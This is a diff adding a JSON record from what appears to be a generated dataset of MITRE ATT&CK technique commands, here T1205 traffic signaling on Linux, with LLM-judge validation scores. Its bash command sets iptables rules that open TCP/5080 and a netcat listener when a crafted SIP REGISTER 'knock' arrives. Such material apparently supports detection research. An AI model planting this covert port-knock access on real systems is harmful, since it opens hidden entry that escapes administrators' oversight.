@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "iptables -I INPUT -m recent --name t1205_sip --rcheck --seconds 60 -p tcp --dport 5080 -j ACCEPT; iptables -I INPUT -p udp --dport 5060 -m string --string \"REGISTER sip:knock\" --algo bm -m recent --name t1205_sip --set -j LOG --log-prefix \"T1205-SIP-SIGNAL \"; nc -l -p 5080 -k >/dev/null 2>&1 &",
+  "explanation": "Leverages SIP on UDP/5060 with a crafted REGISTER line to signal. The firewall logs and marks the source, then opens TCP/5080 where nc listens for 60s. Demonstrates SIP-based signaling and firewall interaction.",
+  "rationale_steps": [
+    "Inspect SIP registration lines for a magic pattern",
+    "Emit firewall logs to surface anomalous SIP messages",
+    "Temporarily grant access to a guarded service upon signal"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-19973fec-03c6080d",
+  "source_prompt_hash": "19973fec",
+  "timestamp_utc": "2025-09-30T03:30:48.198488Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are well-formed with balanced quotes, valid separators, and recognized iptables and nc flags.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements SIP-based signaling with iptables recent to allow TCP/5080 for 60s and logs appropriately, but requires root privileges and assumes environment/netcat flag compatibility for full effect.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T15:44:32.858061Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "All commands are perfectly well-formed with valid syntax, correct flags, balanced quoting, and proper command separators, making them parseable and runnable.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command conceptually demonstrates T1205 Traffic Signaling by using SIP and `iptables` for signaling, its operational feasibility is negated by the `iptables` commands requiring root privileges, which contradicts the stated 'Privilege: None' condition.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:46:01.513940Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
